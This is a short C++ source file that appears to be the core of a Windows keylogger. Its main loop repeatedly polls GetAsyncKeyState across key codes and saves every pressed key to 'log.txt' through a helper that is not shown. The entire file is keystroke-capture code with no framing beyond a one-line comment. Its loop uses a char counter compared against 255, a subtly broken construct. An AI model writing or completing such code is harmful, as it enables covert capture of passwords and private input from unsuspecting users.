# include <iostream>
#include "headers.hpp"
#include <windows.h>
#include <winuser.h>


int main() {

	//if button is pressed
	int pressed = -32767;

	char i;

	while (true){
		for(i = 8; i <= 255; i++){

			if (GetAsyncKeyState(i) == pressed){
				Save(i, "log.txt");
			}
		}
	

	}	

}

